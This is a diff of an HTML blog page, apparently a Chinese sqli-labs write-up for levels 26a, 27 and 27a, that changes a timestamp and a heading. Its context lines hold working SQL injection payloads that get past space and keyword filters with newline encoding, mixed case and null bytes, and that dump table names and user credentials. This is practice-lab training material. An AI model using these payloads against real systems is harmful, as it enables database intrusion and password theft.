@@ -27,7 +27,7 @@
 <meta property="og:description" content="less26a网上博客是说用%a0来代替空格，但是我这环境好像解析不了，也不能用报错注入。最后试出来能用来盲注的payload就是： 1?id&#x3D;&#x27;)||if(length(database())&#x3D;8,1,0);%00 结果牛大b了，在后面27在同样过滤了空格的情况下用其它如%a0能正确解析,可能是我的关卡文件有问题；那不管了，直接做less27。   less27这题过滤对大小写没考虑，">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-03-14T17:06:35.000Z">
-<meta property="article:modified_time" content="2025-03-14T17:59:42.019Z">
+<meta property="article:modified_time" content="2025-03-15T07:36:50.006Z">
 <meta property="article:author" content="aidemofashi">
 <meta property="article:tag" content="sql-labs">
 <meta name="twitter:card" content="summary_large_image">
@@ -284,7 +284,7 @@
 <p>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,3;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(table_name)%0Afrom%0AinfoRmation_schema.tables%0Awhere%0Atable_schema=&#x27;security&#x27;;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(column_name)%0Afrom%0AinfoRmation_schema.columns%0Awhere%0Atable_name=&#x27;users&#x27;%0Aand%0Atable_schema=&#x27;security&#x27;;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(id,username,passwOrd )%0Afrom%0Ausers;%00<br></code></pre></td></tr></table></figure>
 
-<h1 id="less27-1"><a href="#less27-1" class="headerlink" title="less27"></a>less27</h1><p>依旧没用过滤大小写，区别是没用报错回显，不能用报错注入。</p>
+<h1 id="less27a"><a href="#less27a" class="headerlink" title="less27a"></a>less27a</h1><p>依旧没用过滤大小写，区别是没用报错回显，不能用报错注入。</p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">?id=<span class="hljs-number">11111</span><span class="hljs-string">&quot;uNion%0AselecT<span class="hljs-variable">%0A1</span>,2,3;<span class="hljs-variable">%00</span></span><br><span class="hljs-string">?id=11111&quot;</span>uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(table_name)from<span class="hljs-variable">%0AinfoRmation_schema</span>.tables%0Awhere<span class="hljs-variable">%0Atable_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>;<span class="hljs-variable">%00</span><br>?id=<span class="hljs-number">11111</span><span class="hljs-string">&quot;uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(column_name)from<span class="hljs-variable">%0AinfoRmation_schema</span>.columns%0Awhere<span class="hljs-variable">%0Atable_name</span>=&#x27;users&#x27;%0Aand<span class="hljs-variable">%0Atable_schema</span>=&#x27;security&#x27;;<span class="hljs-variable">%00</span></span><br><span class="hljs-string">?id=11111&quot;</span>uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(id,username,password)from<span class="hljs-variable">%0Ausers</span>;<span class="hljs-variable">%00</span><br></code></pre></td></tr></table></figure>
                 
               </div>
